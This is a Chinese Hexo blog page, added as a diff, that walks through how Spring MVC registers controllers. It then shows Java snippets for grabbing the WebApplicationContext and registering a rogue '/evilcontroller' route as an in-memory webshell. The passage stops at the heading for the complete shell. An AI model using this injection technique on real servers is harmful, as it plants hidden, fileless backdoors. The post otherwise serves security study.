@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前置知识Spring是IOC和AOP的容器框架，SpringMVC则是基于Spring功能的Web框架。  IOC容器：IOC容器负责实例化、定位、配置应用程序对象及建立对象依赖。Spring中用BeanFactory实现 Spring作为Java框架，核心组件有三个：Core、Context、Bean。其中context又叫IOC容器；Bean构成应用程序主干，Bean就是对象，由IOC容器统一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="spring内存马">
+<meta property="og:url" content="http://example.com/2023/10/05/spring%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前置知识Spring是IOC和AOP的容器框架，SpringMVC则是基于Spring功能的Web框架。  IOC容器：IOC容器负责实例化、定位、配置应用程序对象及建立对象依赖。Spring中用BeanFactory实现 Spring作为Java框架，核心组件有三个：Core、Context、Bean。其中context又叫IOC容器；Bean构成应用程序主干，Bean就是对象，由IOC容器统一">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC1.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC2.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC3.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC4.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC5.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC6.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC7.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC8.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC9.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC10.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC11.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC12.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC13.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC14.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC15.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC16.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC17.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC18.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC19.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC20.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC21.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC22.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC23.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC24.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC25.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC26.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC27.png">
+<meta property="article:published_time" content="2023-10-05T03:12:55.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:36:54.782Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC1.png">
+
+<link rel="canonical" href="http://example.com/2023/10/05/spring%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>spring内存马 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/05/spring%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          spring内存马
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-10-05 11:12:55" itemprop="dateCreated datePublished" datetime="2023-10-05T11:12:55+08:00">2023-10-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:36:54" itemprop="dateModified" datetime="2025-05-25T11:36:54+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>Spring是IOC和AOP的容器框架，SpringMVC则是基于Spring功能的Web框架。</p>
+<ul>
+<li>IOC容器：IOC容器负责实例化、定位、配置应用程序对象及建立对象依赖。Spring中用BeanFactory实现</li>
+<li>Spring作为Java框架，核心组件有三个：Core、Context、Bean。其中context又叫IOC容器；Bean构成应用程序主干，Bean就是对象，由IOC容器统一管理；Core为处理对象间关系的方法</li>
+</ul>
+<blockquote>
+<p>依赖注入：把有依赖关系的类放到容器中，解析出这些类的实例</p>
+</blockquote>
+<p>spring对象间的依赖关系可以用配置文件的<code>&lt;bean&gt;</code>定义。context的顶级父类ApplicationContext继承了BeanFactory。</p>
+<span id="more"></span>
+
+<h4 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h4><p>Controller负责处理DispatcherServlet分发的请求。将用户请求处理后封装成model返回给view。</p>
+<p>在springmvc中用@Controller标记一个类为Controller。然后用@RequestMapping等来定义URL请求和Controller方法间的映射</p>
+<h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>org.springframework.context.ApplicationContext接口代表了IoC容器，该接口继承了BeanFactory接口。</p>
+<h4 id="ContextLoaderListener"><a href="#ContextLoaderListener" class="headerlink" title="ContextLoaderListener"></a>ContextLoaderListener</h4><p>用来初始化全局唯一的Root Context，也就是Root WebApplicationContext.该WebApplicationContext和其他子Context共享IOC容器，共享bean</p>
+<p>访问和操作bean就需要获得当前环境ApplicationContext</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先新建一个maven项目，然后添加web框架，最终结构如图：</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC1.png" alt="img"></p>
+<p>applicationContext.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line"></span><br><span class="line">       xsi:schemaLocation=&quot;</span><br><span class="line">        http://www.springframework.org/schema/beans</span><br><span class="line">        http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span><br><span class="line">        http://www.springframework.org/schema/context</span><br><span class="line">        http://www.springframework.org/schema/context/spring-context-3.0.xsd</span><br><span class="line">        http://www.springframework.org/schema/mvc</span><br><span class="line">        http://www.springframework.org/schema/mvc/spring-mvc-4.3.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;mvc:annotation-driven/&gt;</span><br><span class="line">    &lt;context:component-scan base-package=&quot;org.example.springmvc&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean</span><br><span class="line">            class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;prefix&quot;&gt;</span><br><span class="line">            &lt;value&gt;/WEB-INF/&lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;suffix&quot;&gt;</span><br><span class="line">            &lt;value&gt;.jsp&lt;/value&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
+
+<p>web.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class="line">         version=&quot;4.0&quot;&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;DispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">            &lt;param-value&gt;classpath:SpringMVC.xml&lt;/param-value&gt;</span><br><span class="line">        &lt;/init-param&gt;</span><br><span class="line">        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;DispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">    &lt;listener&gt;</span><br><span class="line">        &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;</span><br><span class="line">    &lt;/listener&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
+
+<p>TestController.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package org.example.springmvc;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class TestController &#123;</span><br><span class="line">    @RequestMapping(&quot;/index&quot;)</span><br><span class="line">    public String index()&#123;</span><br><span class="line">        return &quot;index&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>点击增加ROOT即可</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC2.png" alt="img"></p>
+<p>启动tomcat</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC3.png" alt="img"></p>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>在index处下个断点</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC4.png" alt="img"></p>
+<h4 id="controller的注册"><a href="#controller的注册" class="headerlink" title="controller的注册"></a>controller的注册</h4><p>在DoDispatch处由DispatcherServlet处理web请求</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC5.png" alt="img"></p>
+<p>这里的ha是RequestMappingHandlerAdapter类对象</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC6.png" alt="img"></p>
+<p>mappedHandler则是通过这段代码获取的</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC7.png" alt="img"></p>
+<p>跟进getHandler方法</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC8.png" alt="img"></p>
+<p>发现里面有个handlerMappings。随后会对handlerMappings进行遍历，再把request传进去取出对应的HandlerExecutionChain返回，在这里打个断点，看看handler是如何获取的？步入getHandler方法</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC9.png" alt="img"></p>
+<p>继续调用getHandlerInternal方法</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC10.png" alt="img"></p>
+<p>继续调用父类的getHandlerInternal方法，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC11.png" alt="img"></p>
+<p>mappingRegistry是当前的路由信息</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC12.png" alt="img"></p>
+<p>这个方法就是解析当前请求的路由，还会给mappingRegistry加锁，继续往下走，进入了lookupHandlerMethod方法</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC13.png" alt="img"></p>
+<p>从mappingRegistry获取路由</p>
+<p>即现在只需知道，怎么往mappingRegistry添加路由就可执行内存马；先从这个方法里找下有没有相关方法，发现有个registerMapping，它的作用就是往mappingRegistry里面注册路由。</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC14.png" alt="img"></p>
+<p>此时我们的目标就变成了，怎么获取到AbstractHandlerMethodMapping的实例。</p>
+<p>由于当前这个类是抽象的、是不可能有实例的。继续看一下它的子类，发现了RequestMappingHandlerMapping可用，接下来就是实现内存马添加。</p>
+<h4 id="RequestMappingHandlerMapping分析"><a href="#RequestMappingHandlerMapping分析" class="headerlink" title="RequestMappingHandlerMapping分析"></a>RequestMappingHandlerMapping分析</h4><p>AbstractHandlerMethodMapping的afterProperties用于bean初始化</p>
+<p>initHandlerMethod()遍历所有bean传入processCandidateBean处理bean，也就是controller</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC15.png" alt="img"></p>
+<p>在processCandidateBean中，getType获取bean类型，通过isHandler进行类型判断，如果bean有controller或RequestMapping注解，就进入detectHandlerMethods解析bean</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC16.png" alt="img"></p>
+<p>在detectHandlerMethods中，用getMappingForMethod创建RequestMappingInfo</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC17.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">具体解析如下：</span><br><span class="line"></span><br><span class="line">MethodIntrospector.selectMethods 是一个方法，它接受两个参数：一个被检查的类（userType）和一个 MetadataLookup 接口的实例。该方法会根据给定的条件筛选出符合条件的方法，并返回一个 Map&lt;Method, T&gt; 对象，其中 Method 是方法对象，T 是方法的元数据。</span><br><span class="line"></span><br><span class="line">(MethodIntrospector.MetadataLookup&lt;T&gt;) method -&gt; &#123; ... &#125; 是一个 Lambda 表达式，实现了 MetadataLookup 接口的方法，用于查找方法的元数据。Lambda 表达式接受一个 method 参数，表示要查找的方法，然后在花括号内实现了具体的方法逻辑。</span><br><span class="line"></span><br><span class="line">在 Lambda 表达式的实现中，首先使用 getMappingForMethod(method, userType) 方法获取给定方法的映射信息。该方法可能会抛出异常，因此使用 try-catch 块捕获异常，并将异常信息包装成 IllegalStateException 抛出。异常信息会包含出错的处理程序类名和方法名。</span><br><span class="line"></span><br><span class="line">最后，将符合条件的方法和其对应的元数据存储在 methods 变量中，即 Map&lt;Method, T&gt; 类型的对象。</span><br><span class="line"></span><br><span class="line">总之，这段代码的作用是从 userType 类中筛选符合条件的方法，并将这些方法和对应的元数据存储在 methods 对象中。具体的筛选条件和元数据的获取逻辑可能需要根据实际代码中的 getMappingForMethod 方法来理解。</span><br></pre></td></tr></table></figure>
+
+<p>处理完后用registryHandlerMethod建立方法到RequestyMappingInfo的映射。也就是注册路由</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC18.png" alt="img"></p>
+<h2 id="Controller内存马构造"><a href="#Controller内存马构造" class="headerlink" title="Controller内存马构造"></a>Controller内存马构造</h2><h4 id="获取WebApplicationContext"><a href="#获取WebApplicationContext" class="headerlink" title="获取WebApplicationContext"></a>获取WebApplicationContext</h4><p>在内存马的构造中，都会获取容器的context对象。在Tomcat中获取的是StandardContext，spring中获取的是<code>WebApplicationContext</code>。（在controller类声明处打上断点可以看到初始化<code>WebApplicationContext</code>的过程）WebApplicationContext继承了BeanFactory，所以能用getBean直接获取RequestMappingHandlerMapping，进而注册路由。</p>
+<p>所以重点是如何获取WebApplicationContext</p>
+<h5 id="获取WebApplicationContext-1"><a href="#获取WebApplicationContext-1" class="headerlink" title="获取WebApplicationContext:"></a>获取WebApplicationContext:</h5><p>由于webApplicationContext对象存放于servletContext中。并且键值为<code>WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE</code></p>
+<p>所以可以直接用servletContext#getAttribute()获取属性值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext wac = (WebApplicationContext)servletContext.getAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);</span><br></pre></td></tr></table></figure>
+
+<p>webApplicationContextUtils提供了下面两种方法获取webApplicationContext。需要传入servletContext</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContextUtils.getRequeiredWebApplicationContext(ServletContext s);</span><br><span class="line">WebApplicationContextUtils.getWebApplicationContext(ServletContext s);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>spring 5的WebApplicationContextUtils已经没有getWebApplicationContext方法</p>
+</blockquote>
+<h5 id="获取ServletContext"><a href="#获取ServletContext" class="headerlink" title="获取ServletContext"></a>获取ServletContext</h5><p>通过request对象或者ContextLoader获取ServletContext</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 1</span><br><span class="line">ServletContext servletContext = request.getServletContext();</span><br><span class="line">// 2</span><br><span class="line">ServletContext servletContext = ContextLoader.getCurrentWebApplicationContext().getServletContext();</span><br></pre></td></tr></table></figure>
+
+<h5 id="获取request可以用RequestContextHolder"><a href="#获取request可以用RequestContextHolder" class="headerlink" title="获取request可以用RequestContextHolder"></a>获取request可以用RequestContextHolder</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder</span><br><span class="line">        .getRequestAttributes()).getRequest();</span><br></pre></td></tr></table></figure>
+
+<h5 id="spring中获取context的方式一般有以下几种"><a href="#spring中获取context的方式一般有以下几种" class="headerlink" title="spring中获取context的方式一般有以下几种"></a>spring中获取context的方式一般有以下几种</h5><p>①直接通过ContextLoader获取，不用再经过servletContext。不过ContextLoader一般会被ban</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure>
+
+<p>②通过RequestContextHolder获取request，然后获取servletRequest后通过RequestContextUtils得到WebApplicationContext</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></pre></td></tr></table></figure>
+
+<p>③用RequestContextHolder直接从键值org.springframework.web.servlet.DispatcherServlet.CONTEXT中获取Context</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br></pre></td></tr></table></figure>
+
+<p>④直接反射获取WebApplicationContext</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field filed = Class.forName(&quot;org.springframework.context.support.LiveBeansView&quot;).getDeclaredField(&quot;applicationContexts&quot;);</span><br><span class="line">filed.setAccessible(true);</span><br><span class="line">org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(null)).iterator().next();</span><br></pre></td></tr></table></figure>
+
+<p>实际上常用的就2,3。</p>
+<p>其中1获取的是Root WebApplicationContext，2，3通过RequestContextUtils获取的是叫dispatcherServlet-servlet的Child WebApplicationContext。</p>
+<blockquote>
+<p>在有些Spring 应用逻辑比较简单的情况下，可能没有配置 <code>ContextLoaderListener</code> 、也没有类似 <code>applicationContext.xml</code> 的全局配置文件，只有简单的 <code>servlet</code> 配置文件，这时候通过1方法是获取不到<code>Root WebApplicationContext</code>的。</p>
+</blockquote>
+<h4 id="模拟注册Controller"><a href="#模拟注册Controller" class="headerlink" title="模拟注册Controller"></a>模拟注册Controller</h4><p>在spring2.5-3.1使用DefaultAnnotationHandlerMapping处理URL映射。spring3.1以后使用RequestMappingHandlerMapping</p>
+<p>模拟注册Controller的方式一般有三种：</p>
+<h5 id="源码分析就介绍的，registryMapping直接注册requestMapping"><a href="#源码分析就介绍的，registryMapping直接注册requestMapping" class="headerlink" title="源码分析就介绍的，registryMapping直接注册requestMapping"></a>源码分析就介绍的，registryMapping直接注册requestMapping</h5><p>直接通过getBean就能获取RequestMappingHandlerMapping</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure>
+
+<p>生成RequestMappingInfo。需要传入PatternsRequestCondition（Controller映射的URL）和RequestMethodsRequestCondition（HTTP请求方法）</p>
+<p><img src="https://ilikeoyt.github.io/image/s%E5%86%85%E5%AD%98%E9%A9%AC19.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PatternsRequestCondition url = new PatternsRequestCondition(&quot;/evilcontroller&quot;);</span><br><span class="line">RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();</span><br><span class="line">RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span><br></pre></td></tr></table></figure>
+
+<p>完整shell</p>
